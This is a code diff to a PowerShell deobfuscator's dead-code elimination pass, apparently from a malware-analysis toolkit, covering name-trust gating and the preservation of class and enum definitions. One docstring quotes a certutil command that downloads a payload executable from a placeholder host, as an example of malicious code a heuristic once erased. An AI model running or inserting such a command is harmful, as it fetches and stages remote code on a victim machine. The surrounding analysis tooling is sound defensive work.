@@ -32,10 +32,12 @@ from refinery.lib.scripts.ps1.model import (
     Ps1BinaryExpression,
     Ps1BreakStatement,
     Ps1CatchClause,
+    Ps1ClassDefinition,
     Ps1CommandArgument,
     Ps1CommandInvocation,
     Ps1ContinueStatement,
     Ps1DoLoop,
+    Ps1EnumDefinition,
     Ps1ExpressionStatement,
     Ps1ForLoop,
     Ps1IfStatement,
@@ -98,16 +100,18 @@ def _is_injected_noise_bareword(expr: Expression, world: Ps1WorldReach) -> bool:
     so `try { certutil -urlcache -split -f http://host/payload.exe } catch { }` erased itself.
 
     The whole guess rests on the command table being the one the metadata describes, so it is only
-    made in a closed world. A script that dot-sources a file, imports a module, defines an alias or
-    runs `iex` can make any bareword resolve to real code, and only the redefinitions spelled as a
-    `function` reach the shadow set — the world verdict covers the rest, which is why the
-    precondition sits here rather than another name-by-name list.
+    made where the name is trustworthy: `may_trust_command_name` below. A script that dot-sources a
+    file, imports a module, defines an alias or runs `iex` can make any bareword resolve to real
+    code, and only the redefinitions spelled as a `function` reach the shadow set — the world
+    verdict the name-trust gate reads covers the rest, which is why the precondition sits here
+    rather than in another name-by-name list. Trust is a whole-run question about a name, not a
+    position one: a surviving `Set-Alias` hides a mutator behind a later bareword no forward flood
+    would poison, so a position gate (`closed_at`) is the wrong gate here and would only ever agree
+    with the name gate it stands beside, never narrow it.
     """
     if not isinstance(expr, Ps1CommandInvocation):
         return False
     if not isinstance(expr.name, Ps1StringLiteral):
-        return False
-    if not world.closed_at(expr):
         return False
     name = expr.name.value
     name_lower = name.lower()
@@ -378,6 +382,34 @@ def _switch_clause_body(body: list[Statement]) -> tuple[list[Statement], bool] |
     return stmts, stop
 
 
+def _type_definition_ids(node: Node) -> set[int]:
+    """
+    The ids of every `class` and `enum` definition standing anywhere under `node`. PowerShell
+    registers these when it compiles the script, before the first statement runs, so their effect
+    does not depend on the control flow that reaches them.
+    """
+    return {
+        id(definition)
+        for definition in node.walk()
+        if isinstance(definition, (Ps1ClassDefinition, Ps1EnumDefinition))
+    }
+
+
+def _drops_a_type_definition(stmt: Statement, replacement: list[Statement]) -> bool:
+    """
+    Whether pruning `stmt` to `replacement` would delete a `class` or `enum` definition that the
+    replacement does not carry forward. A prune reuses the node objects it keeps, so a definition
+    surviving in a taken branch appears by identity in both; one only in a dropped region does not,
+    and deleting it would unregister a type the compiled script still defines.
+    """
+    dropped = _type_definition_ids(stmt)
+    if not dropped:
+        return False
+    for kept in replacement:
+        dropped -= _type_definition_ids(kept)
+    return bool(dropped)
+
+
 class Ps1DeadCodeElimination(Transformer):
     """
     Remove unreachable code guarded by constant boolean conditions and resolve switch statements
@@ -385,27 +417,24 @@ class Ps1DeadCodeElimination(Transformer):
     """
 
     def visit(self, node: Node):
-        # The world is captured once, not re-read per body: `set_body` below advances the tree
-        # version, so a per-call-site lookup would rebuild the control-flow flood after every prune.
-        # The captured world binds its flow-sensitive grants to the tree it measured and refuses —
-        # falls back to the whole-run verdict — once that version advances, so a prune that moved a
-        # read can never turn a held grant unsound; it only defers the grant to the next pass. The
-        # cache itself is threaded so that reachability is read fresh per body: a reachability
-        # verdict must reflect the current tree, and reading it through the version-aware cache
-        # rebuilds only after a body has actually changed.
         cache = model_cache(self, node)
-        world = cache.world_reach
         for parent in list(node.walk()):
             sink = output_sink(parent)
             if sink is None or sink is OutputSink.CAPTURED:
                 continue
-            if self._prune_body(parent, world, cache):
+            if self._prune_body(parent, cache):
                 self.mark_changed()
 
-    def _prune_body(self, parent: Node, world: Ps1WorldReach, cache: Ps1ModelCache) -> bool:
+    def _prune_body(self, parent: Node, cache: Ps1ModelCache) -> bool:
         """
         Rewrite each statement of one body into what its condition has already been proved to make
         of it, or leave it alone.
+
+        The world and the reachability graph are read fresh from the version-keyed cache per body,
+        not captured across the walk: a prune advances the tree version, and a held world would then
+        answer at its fail-closed pole for every later body of the same pass. A body whose prune
+        bumps the version rebuilds both; a body that changes nothing reads the same cached objects
+        back.
 
         This pass used to also drop bare constants wherever it read the body's value as unobserved,
         which was the narrowest slice of `StatementEffect.OUTPUT` and still a slice of it: `42` at
@@ -420,8 +449,12 @@ class Ps1DeadCodeElimination(Transformer):
         statements the control-flow graph reports no path can reach — a statement after `return`,
         `throw` or `exit`, which never runs and so cannot be what an enclosing handler catches. Its
         removal cannot empty a body that pruning was not already entitled to empty, because a body's
-        entry is always reachable.
+        entry is always reachable. A prune that would drop a `class` or `enum` definition standing
+        in the deleted region is refused whole, because the engine registers those when it compiles
+        the script — before any statement runs — so one inside a branch that never executes still
+        defines its type, and deleting it changes what the surviving script resolves that name to.
         """
+        world = cache.world_reach
         dominance = cache.dominance
         reachable_by_graph: dict[int, frozenset[int]] = {}
 
@@ -446,10 +479,13 @@ class Ps1DeadCodeElimination(Transformer):
                 and not isinstance(stmt, Ps1TrapStatement)
                 and self._is_unreachable(stmt, dominance, reachable_of)
             ):
-                plan.propose(stmt, [])
-                continue
-            replacement = self._try_prune(stmt, world, dominance)
-            if replacement is None:
+                replacement: list[Statement] = []
+            else:
+                pruned = self._try_prune(stmt, world, dominance)
+                if pruned is None:
+                    continue
+                replacement = pruned
+            if _drops_a_type_definition(stmt, replacement):
                 continue
             plan.propose(stmt, replacement)
         return plan.commit()
